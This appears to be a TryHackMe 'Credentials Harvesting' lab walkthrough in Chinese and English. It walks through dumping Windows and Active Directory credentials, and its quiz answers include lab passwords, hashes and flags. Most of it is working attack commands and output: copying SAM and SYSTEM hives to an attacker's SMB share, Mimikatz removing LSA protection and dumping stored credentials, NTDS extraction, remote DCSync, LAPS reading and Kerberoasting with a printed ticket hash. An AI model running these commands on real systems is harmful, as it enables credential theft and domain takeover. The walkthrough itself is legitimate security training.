# Task 2  Credentials Harvesting

```
xfreerdp /u:thm /p:'Passw0rd!' /v:10.10.50.83 +clipboard
```

# Task 3  Credential Access

用户凭据通常会出现在：

1. Clear-text files（明文文件）

攻击者可能感兴趣的一些明文文件类型：

> Commands history（命令行历史记录）
> Configuration files (Web App, FTP files, etc.)（配置文件）
> Other Files related to Windows Applications (Internet Browsers, Email Clients, etc.)（与 Windows 应用程序（Internet 浏览器、电子邮件客户端等）相关的其他文件）
> Backup files（备份文件）
> Shared files and folders（共享文件夹和文件）
> Registry（注册表）
> Source code （源代码）


powershell历史记录存储在：
```
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

2. Database files（数据库文件）

3. Memory（内存）

包括

> Clear-text credentials（明文凭据）
> Cached passwords（缓存密码）
> AD Tickets（活动目录票据）

4. Password managers（密码管理器）

分为：
> Built-in password managers (Windows)(内置密码管理器 (Windows))
> Third-party: KeePass, 1Password, LastPass（第三方：KeePass、1Password、LastPass）

5. Enterprise Vaults（企业保险库）

6. Active Directory（活动目录）

一些可能泄露用户凭据的 Active Directory 错误配置

> Users' description: Administrators set a password in the description for new employees and leave it there, which makes the account vulnerable to unauthorized access. (用户描述：管理员在新员工的描述中设置密码并留在那里，这使得帐户容易受到未经授权的访问)

> Group Policy SYSVOL: Leaked encryption keys let attackers access administrator accounts. (组策略 SYSVOL：泄露的加密密钥让攻击者可以访问管理员帐户)

> NTDS: Contains AD users' credentials, making it a target for attackers.(包含 AD 用户的凭据，使其成为攻击者的目标)

> AD Attacks: Misconfiguration makes AD vulnerable to various attacks(AD 攻击：错误配置使 AD 容易受到各种攻击)

7. Network Sniffing（网络嗅探）

使用命令
```
reg query HKLM /f password /t REG_SZ /s

<skip..>
HKEY_LOCAL_MACHINE\SYSTEM\THM
    flag    REG_SZ    password: 7tyh4ckm3
```

> Use the methods shown in this task to search through the Windows registry for an entry called "flag" which contains a password. What is the password?

> 7tyh4ckm3

> Enumerate the AD environment we provided. What is the password of the victim user found in the description section?

> Passw0rd!@#


# Task 4  Local Windows Credentials

转存sam和system文件
```
C:\Users\Administrator\Desktop>reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
The operation completed successfully.

C:\Users\Administrator\Desktop>reg save HKLM\system C:\users\Administrator\Desktop\system-reg
The operation completed successfully.
```

kali开一个共享
```
/usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username thm -password Passw0rd!
```

复制文件到kali
```
C:\Users\Administrator\Desktop>copy sam-reg \\10.13.21.169\share\
        1 file(s) copied.

C:\Users\Administrator\Desktop>copy system-reg \\10.13.21.169\share\
		1 file(s) copied.
```

使用secretsdump.py dump出哈希

```
/usr/share/doc/python3-impacket/examples/secretsdump.py -sam /root/tryhackme/sam-reg -system /root/tryhackme/system-reg LOCAL
```

> Follow the technique discussed in this task to dump the content of the SAM database file. What is the NTLM hash for the Administrator account?

> 98d3a787a80d08385cea7fb4aa2a4261

# Task 5  Local Security Authority Subsystem Service (LSASS).

如果启用了 LSA 保护，执行“sekurlsa::logonpasswords”命令会出错。

```
mimikatz # sekurlsa::logonpasswords
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

禁用 LSA 保护。我们可以通过执行“！+”将其导入到 Mimikatz

```
mimikatz # !+
[*] 'mimidrv' service not present
[+] 'mimidrv' service successfully registered
[+] 'mimidrv' service ACL to everyone
[+] 'mimidrv' service started
```

如果执行完上面程序仍然还不可以导出哈希，那么使用下面命令禁用 LSA 保护

```
mimikatz # !processprotect /process:lsass.exe /remove
Process : lsass.exe
PID 528 -> 00/00 [0-0-0]
```

> Is the LSA protection enabled? (Y|N)

> Y

# Task 6  Windows Credential Manager

什么是凭证管理器？

凭据管理器是一项 Windows 功能，用于存储网站、应用程序和网络的登录敏感信息。它包含登录凭据，例如用户名、密码和 Internet 地址。有四种凭据类别：

1. Web credentials contain authentication details stored in Internet browsers or other applications.（Web 凭据包含存储在 Internet 浏览器或其他应用程序中的身份验证详细信息）

2. Windows credentials contain Windows authentication details, such as NTLM or Kerberos.（Windows 凭据包含 Windows 身份验证详细信息，例如 NTLM 或 Kerberos）

3. Generic credentials contain basic authentication details, such as clear-text usernames and passwords.（通用凭据包含基本身份验证详细信息，例如明文用户名和密码）

4. Certificate-based credentials: Athunticated details based on certifications.（基于证书的凭据：基于认证的详细信息）

## Credential Dumping
导出web credentials，使用[Get-WebCredentials.ps1](https://github.com/samratashok/nishang/blob/master/Gather/Get-WebCredentials.ps1)

```
c:\Tools>powershell -ep bypass
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Tools> . .\Get-WebCredentials.ps1
PS C:\Tools> Get-WebCredentials

UserName Resource             Password     Properties
-------- --------             --------     ----------
THMuser  internal-app.thm.red E4syPassw0rd {[hidden, False], [applicationid, 00000000-0000-0000-0000-000000000000], ...

```

## RunAs

使用```cmdkey```命令列出存储在本机上的windows凭据
```
PS C:\Tools> cmdkey /list

Currently stored credentials:

    Target: WindowsLive:target=virtualapp/didlogical
    Type: Generic
    User: 02qlpqmzrgmmbamm
    Local machine persistence

    Target: LegacyGeneric:target=10.10.237.226
    Type: Generic
    User: thm

    Target: Domain:interactive=thm.red\thm-local
    Type: Domain Password
    User: thm.red\thm-local
```

使用```thm.red\thm-local```的身份运行一个cmd
```
runas /savecred /user:THM.red\thm-local cmd.exe
```

在新的cmd下获取确认当前身份，读取flag
```
C:\Windows\system32>whoami
thm\thm-local

C:\Windows\system32>type "c:\Users\thm-local\Saved Games\flag.txt"
THM{RunA5S4veCr3ds}
```

## Mimikatz

使用Mimikatz导出credentials manager里的信息

```
PS C:\Tools\Mimikatz> .\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::credman
..
..
Authentication Id : 0 ; 1033158 (00000000:000fc3c6)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 9/14/2022 5:54:31 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

Authentication Id : 0 ; 1033118 (00000000:000fc39e)
Session           : RemoteInteractive from 2
User Name         : thm
Domain            : THM
Logon Server      : CREDS-HARVESTIN
Logon Time        : 9/14/2022 5:54:31 AM
SID               : S-1-5-21-1966530601-3185510712-10604624-1114
        credman :
         [00000000]
         * Username : thm
         * Domain   : 10.10.237.226
         * Password : jfxKruLkkxoPjwe3
         [00000001]
         * Username : thm.red\thm-local
         * Domain   : thm.red\thm-local
         * Password : Passw0rd123

```

> Apply the technique for extracting clear-text passwords from Windows Credential Manager. What is the password of the THMuser for internal-app.thm.red?

> E4syPassw0rd

> Use Mimikatz to memory dump the credentials for the 10.10.237.226 SMB share which is stored in the Windows Credential vault. What is the password?

> jfxKruLkkxoPjwe3

> Run cmd.exe under thm-local user via runas and read the flag in "c:\Users\thm-local\Saved Games\flag.txt". What is the flag?

> THM{RunA5S4veCr3ds}

# Task 7  Domain Controller


转存ntds
```
powershell "ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\temp' q q"
```

拷贝到kali,使用secretsdump.py dump出哈希

```
secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local
```

远程导出哈希
```
secretsdump.py -just-dc THM.red/thm@10.10.50.83
```

> Apply the technique discussed in this task to dump the NTDS file locally and extract hashes. What is the target system bootkey value? Note: Use thm.red/thm as an Active Directory user since it has administrator privileges!

> 0x36c8d26ec0df8b23ce63bcefa6e2d821

> What is the clear-text password for the bk-admin username?

> Passw0rd123

# Task 8  Local Administrator Password Solution (LAPS)

Creds-Harvestin的密码
```
PS C:\Windows\system32> Get-AdmPwdPassword -ComputerName Creds-Harvestin

ComputerName         DistinguishedName                             Password           ExpirationTimestamp
------------         -----------------                             --------           -------------------
CREDS-HARVESTIN      CN=CREDS-HARVESTIN,OU=THMorg,DC=thm,DC=red    THMLAPSPassw0rd    2/11/2338 11:05:2...
```

枚举有ExtendedRightHolders的组
```
PS C:\Windows\system32> Find-AdmPwdExtendedRights -Identity THMorg

ObjectDN                                      ExtendedRightHolders
--------                                      --------------------
OU=THMorg,DC=thm,DC=red                       {THM\LAPsReader}
```

枚举LAPsReader组成员
```
PS C:\Windows\system32> net group "LAPsReader"
Group name     LAPsReader
Comment

Members

-------------------------------------------------------------------------------
bk-admin
```


> Which group has ExtendedRightHolder and is able to read the LAPS password?

> LAPsReader

> Follow the technique discussed in this task to get the LAPS password. What is the LAPs Password for Creds-Harvestin computer?

> THMLAPSPassw0rd

> Which user is able to read LAPS passwords?

> bk-admin

# Task 9  Other Attacks

枚举靶机的spn
```
┌──(root💀kali)-[~/tryhackme/CredentialsHarvesting]
└─# GetUserSPNs.py -dc-ip 10.10.50.83 THM.red/thm
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 05:47:33.796826  <never>      
```

请求这个spn
```
┌──(root💀kali)-[~/tryhackme/CredentialsHarvesting]
└─# GetUserSPNs.py -dc-ip 10.10.50.83 THM.red/thm -request-user svc-thm                                       130 ⨯
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------------  -------  --------  --------------------------  ---------  ----------
http/creds-harvestin.thm.red  svc-thm            2022-06-10 05:47:33.796826  <never>               



$krb5tgs$23$*svc-thm$THM.RED$THM.red/svc-thm*$b048529f128f8015a4fa1a4363573a61$4650048218c8b2216b2d05bc6f0eb710f05686ead8eab6b6710246326af22be4899575ac8d89e0f07ac50841d298076b5ff7c2118e72feb968e47081d49833ae5fc488e48dea8ca39f469848db96a4d301e3b8cafb5d9832ab6225edc35e275920d41cffed1154aa85c99b02ada8f0e7a501232a4acdec933f56cfb79bdbbe9643b599d027e411751f2382c991aeb401fa43a888fa4663abe0f86b4a969e1022ca9b9ac56156a6898d71bce9edbea96cf99c1f8d5c19f09c5b43051bfe8a8e81b38fedf7e5c7fbea5e170f444c5798c954a3a22d75dccd87a8bfb480d9c19db735e31125b90b56ad4dea682ada9fcc33797036fbec3e531f39ff25fa70ffad3c5ea324e9070c53183bbe682ea2908a94c1f8d97e201e919c1392f362b3c844e8e4a45a5b41b34c310428301566aa1445132bcf7ad1a65c0fd86a1f18e0a9e0961b62cec6bcd4631a2a555812c651fe568a930b89fe53a6a652d1b7959cbdcc1174a5dd6ca649d24fde1da0544b9d5508ef042afdf0415bb72d9f3b03a2cd04d8a99d857950b313e86e9190b06877d5379e75e81fc5ffe6471e5126bca69af3fb88be842748b19d36abf0edcf5c3ac362c9371418d99b684577cca1320bd2d4ce0fe45fd3287802c6915c9c30c805f40ffd422444dc3b2a93936a115a679f180ef75696e7dfe9b37e7af7ecb50490e5d76362db69be8fc0bbdf8d0b2b07c97dbf3da46e8740873bfcef7da5ee96512b2828a8061cb48b4af51e2d6794e7c3860154e4f457cf309ca51452221c4c2ae3a0735ebed71f7e30a680e960fb6a3d4eb97543d04e9de9f9776a7b42e9932560d19c6aac854422ac631e8656683e9ce56563ac3c5f7ee2b794e5eb1c5233736affd64f447c48681656536fc43788957e5fdfbd323e5ea00f084b6b68976e32dc77aaca858c251145213251ad795856d32ecf6b94aebb142329b7f6feecaf6479e064168f7293d0a0a7676e305fbd5b8d621a97807fe8262b40cf5551d16163d722cb44b1f926e9b22227b2ef61871cf93bb5cd1e669f5593213ca9891325df72dba527cb0a402a4186819d0de23ad71f36cab440514da22b37ad77fe151763f15ebc6b4797f827489b759d16372a40b5b36dbb341a43bbd82ed5b77e97393d78decd139180dacc51290b15d52ca120c4c1c45b619756e6e30896a1953c211803c9b00b45602960ab5d47b44ff363810c6317eeb0d862bdc5aa231148c8d248dc45e2caab2b59922c55

```

保存上面的哈希到本地，破解
```
┌──(root💀kali)-[~/tryhackme/CredentialsHarvesting]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Passw0rd1        (?)     
1g 0:00:00:00 DONE (2022-09-14 04:09) 3.333g/s 756053p/s 756053c/s 756053C/s SOCCER2..GAMECUBE
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

> Enumerate for SPN users using the Impacket GetUserSPNs script. What is the Service Principal Name for the Domain Controller?

> svc-thm

> After finding the SPN account from the previous question, perform the Kerberoasting attack to grab the TGS ticket and crack it. What is the password?

> Passw0rd1